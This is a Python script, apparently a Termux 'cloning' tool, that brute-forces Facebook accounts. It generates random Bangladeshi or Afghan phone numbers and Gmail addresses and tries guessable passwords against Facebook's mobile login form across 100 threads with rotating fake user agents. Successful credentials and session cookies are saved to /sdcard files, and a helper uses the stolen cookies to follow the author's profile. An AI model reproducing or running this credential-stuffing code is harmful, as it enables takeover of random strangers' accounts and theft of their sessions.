# Facebook: 𝐍𝐚𝐪𝐞𝐞𝐛𝐮𝐥𝐥𝐚𝐡 𝐒𝐚𝐛𝐢𝐫
# Github: 𝐍𝐚𝐪𝐞𝐞𝐛 𝐒𝐚𝐛𝐢𝐫
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
sn4gdh9 = open
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    import os
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    os.sytem('pkg install espeak')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŒº] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŒº] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100076855636497', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'
snigdho_Hasan = print    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
#os.system('xdg-open https://www.facebook.com/profile.php?id=100076855636497')
os.system('espeak -a 120 "WELCOME TO SABIR RANDOM CLONING TOOLS"')
os.system('espeak -a 120 "I LOY YOU FRAM AFGHANSTAN"')
logo ="""
███████╗ █████╗ ██████╗ ██╗██████╗ 
██╔════╝██╔══██╗██╔══██╗██║██╔══██╗
███████╗███████║██████╔╝██║██████╔╝
╚════██║██╔══██║██╔══██╗██║██╔══██╗
███████║██║  ██║██████╔╝██║██║  ██║
╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═╝                                    
\x1b[1;97m[+]==============================================[+]
\x1b[1;91m[+] CREATED BY   :  𝐍𝐀𝐐𝐄𝐄𝐁𝐔𝐋𝐋𝐀𝐇 𝐒𝐀𝐁𝐈𝐑
\x1b[1;92m[+] ON FACEBOK   :  𝐍𝐀𝐐𝐄𝐄𝐁𝐔𝐋𝐋𝐀𝐇 𝐒𝐀𝐁𝐈𝐑
\x1b[1;93m[+] ON GITHUB    :  𝐍𝐀𝐐𝐄𝐄𝐁𝐔𝐋𝐋𝐀𝐇 𝐒𝐀𝐁𝐈𝐑
\x1b[1;94m[+] TOOL STATUS  :  𝐅𝐑𝐄𝐄
\x1b[1;95m[+] TOOL VIRSION :  1.0.2
\x1b[1;96m[+]==============================================[+]"""
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    snigdho_Hasan(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    snigdho_Hasan('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:snigdho_Hasan('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        snigdho_Hasan('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=['Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF']
ugen=[
    'Mozilla/5.0 (Linux; Tizen 2.3; SAMSUNG SM-Z130H) AppleWebKit/537.3 (KHTML, like Gecko) SamsungBrowser/1.0 Mobile Safari/537.3',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.0',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900V 4G Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A137F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-T280) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A127M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',]

for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
# APK CHECK EMIL# APK CHECK EMIL# APK CHECK EMIL# APK CHECK EMIL
def snigdho():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/profile.php?id=100076855636497')
    snigdho_Hasan(logo)
    print ('\x1b[1;96m[1]  Clone From RANDOM BD    \033[1;36m[V1]')
    print ('\x1b[1;91m[2]  Clone From GMAIL        \033[1;32m[V1]')
    print ('\x1b[1;96m[3]  Clone From RANDOM AFG    \033[1;36m[V1]')
    print ('\x1b[1;92m[4]  Contact Me')
    print ('\x1b[1;96m[0]  EXIT\033[1;32m')
    print ('\x1b[1;92m------------------------------')
    action()
    print (50 * '-')
    action()
def action():
    global cpb
    global oks
    os.system('xdg-open https://www.facebook.com/profile.php?id=100076855636497')
    shuvo = input('\nINPUT===>   ')
    if shuvo == '':
        print()
        action()
    elif shuvo == '1':
        os.system('clear')
        snigdho_bd()
    elif shuvo == '2':
        os.system('clear')
        snigdho_email()
    elif shuvo == '3':
        os.system('clear')
        snigdho_pk()
    elif shuvo == '4':
        os.system('clear')
        os.system('xdg-open https://www.facebook.com/profile.php?id=100076855636497')
        print (logo)
        print('[1]Facebook \n [2] Whatapp')
        mahd = input('Chouse :')
        if mahd =='1':
            os.system("xdg-open https://facebook.com/devilsnigdho.00")
            snigdho()
        elif mahd == '2':
            os.system('xdg-open https://chat.whatsapp.com/GjQUpvAucZN8c81KNlgqmm')
            snigdho()
# APK CHECK EMIL
def snigdho_email():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    snigdho_Hasan(logo)
    snigdho_Hasan(f' [{xr}^{x}] Example>: {xr}9377,9370,9374,9379,9378{x}')
    snigdho_Hasan(" -----------------------------------------------------------------------------------")
    rk1 = '.'
    rk2 = '1'
    rk3 = '0'
    rk4 = '.'
    code = random.choice([rk1,rk2,rk3,rk4])                      
    # input(f' [{xr}â– {x}] Choose : ')
    os.system('clear')
    snigdho_Hasan(logo)
    fastname = input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93msnigdho, \x1b[38;5;208mhasan, \033[0;92mshuvo ] \n\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING FAST NAME:\033[0;93m ')
    os.system('clear')
    snigdho_Hasan(logo)
    lasttname = input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93msnigdho, \x1b[38;5;208mhasan, \033[0;92mshuvo ] \n\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LAST NAME:\033[0;93m ')
    snigdho_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m1000, \x1b[38;5;208m2000, \033[0;92m5000 ] \n\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(3))
        user.append(nmp)
    os.system("clear")
    snigdho_Hasan(logo)
    passx = 0
    HamiiID = []
    snigdho_Hasan("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {Sabir+Sabir} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=100) as manshera:
        clear()
        tl = str(len(user))
        snigdho_Hasan('\033[1;97m====================================================')
        snigdho_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        snigdho_Hasan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        snigdho_Hasan(f'{x}[{xr}^{x}]\033[0;92m YOU INPU NAME :'+fastname+lasttname)
        snigdho_Hasan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        snigdho_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSlow Cloning')
        snigdho_Hasan('\033[1;97m====================================================')
        for love in user:
            snigdhouser=fastname+code+lasttname+love
            pwx = [fastname+lasttname,fastname+lasttname+love,fastname+love,lasttname+love,'bangladesh','i love you','free fire',fastname+'123',lasttname+'123']
            uid = snigdhouser+'@gmail.com'
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ------------------------------------------------------------------------------------------------------------------")

#RANDOM BD     
def snigdho_bd():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    snigdho_Hasan(logo)
    snigdho_Hasan(f' [{xr}^{x}] Example>: {xr}9377,9370,9374,9379,9378{x}')
    snigdho_Hasan(" --------------------------------------------------------------------------------------")
    rk1 = '01'
    code = random.choice([rk1])                      # input(f' [{xr}â– {x}] Choose : ')
    os.system('clear')
    snigdho_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m1000, \x1b[38;5;208m2000, \033[0;92m5000 ] \n\033[0;95m------------------------------------------------------------------------------------------------------------------ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(9))
        user.append(nmp)
    os.system("clear")
    snigdho_Hasan(logo)
    passx = 0
    HamiiID = []
    snigdho_Hasan("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {Sabir+Sabir} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=100) as manshera:
        clear()
        tl = str(len(user))
        snigdho_Hasan('\033[1;97m====================================================')
        snigdho_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        snigdho_Hasan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        snigdho_Hasan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        snigdho_Hasan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        snigdho_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        snigdho_Hasan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[3:],code+love,love[1:],'Afghanstan','Afghanstan','i love you','free fire','freefire']
            uid = code+love
            for snigdho in HamiiID:
                pwx.append(snigdho)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} --------------------------------------------------------------------------------------")


#_______
def snigdho_pk():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    snigdho_Hasan(logo)
    snigdho_Hasan(f' [{xr}^{x}] Example>: {xr}9377,9370,9374,9379,9378.ETC{x}')
    snigdho_Hasan(" ----------------------------------------------------------------------------------------------------")

    code = input(f' [{xr}â– {x}] PUT YOUR SIM CODE : ')
    os.system('clear')
    snigdho_Hasan(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m1000, \x1b[38;5;208m2000, \033[0;92m5000 ] \n\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    snigdho_Hasan(logo)
    passx = 0
    HamiiID = []
    snigdho_Hasan("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {Sabir+Sabir} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=100) as manshera:
        clear()
        tl = str(len(user))
        snigdho_Hasan('\033[1;97m====================================================')
        snigdho_Hasan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        snigdho_Hasan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        snigdho_Hasan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        snigdho_Hasan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        snigdho_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        snigdho_Hasan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[3:],code+love,love[1:],'khankhan','afghan1122','Afghan12345','afghan123','khan123456','i 100200','500 600','500 9']
            uid = code+love
            for snigdho in HamiiID:
                pwx.append(snigdho)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} --------------------------------------------------------------------------------------------------------------------------------------------------------------------------")



def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            pro = random.choice(ugen2)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
    'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=ercKZdbGMkSjeBbXeYInQASJ; sb=ercKZQwR3Ipjq20xyaRgGWRN; m_pixel_ratio=1.75; wd=412x758; fr=01cuMzGE8ET7dKsuP..BlCrd6.KI.AAA.0.0.BlCrq4.AWVbj8gognw',
    'dpr': '1.75',
    'referer': 'https://www.google.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A307GN"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[SABIR-OK] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                sn4gdh9('/sdcard/SABIR-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[SABIR-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                sn4gdh9('/sdcard/SABIR-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}SABIR{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass


def reg():
    os.system('clear')
    print(logo)
    print ('')
    print ('\x1b[1;31;1mWATE FOR LOGING APROVAL')
    print ('')
    time.sleep(1)
    try:
        to = open('/sdcard/.ma.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/Shuvo-BBHH/snigdho-mex/main/aproval.text').text
    if to in r:
        os.system('clear')
        print('WELL COME TO PAID MANU')
        time.sleep(5)
        ()
    else:
        os.system('clear')     
        print ('\tApproved Failed')
        print (' \x1b[1;92mYour Id Is Not Approved ')
        print (' \x1b[1;92mCopy the id and send to Admin')
        print (' \x1b[1;92mYour id : ' + to)
        input('\x1b[1;93m Press enter to send id')
        os.system('am start https://chat.whatsapp.com/GjQUpvAucZN8c81KNlgqmm?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20snigdho%20Paid%20Tools.%20My%20Key:%20'+id+snigdho)
        reg()


def reg2():
    os.system('clear')
    print(logo)
    snigdho='=snigdho=MEX='
    print ('\tApproval not detected')
    print (' \x1b[1;92mCopy and press enter ,')
    id = uuid.uuid4().hex[:10]
    print (' Your id: ' + id+snigdho)
    print ('')
    input(' Press enter to go to whatsapp ')
    os.system('am start https://wa.me/+8801616406924?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20snigdho=MEX%20Paid%20Tools.%20My%20Key:%20'+id+snigdho)
    sav = open('/sdcard/.ma.txt', 'w')
    sav.write(id+snigdho)
    sav.close()
    input('\x1b[1;92m Press enter to check Approval ')
    reg()

if __name__=='__main__':
    snigdho()


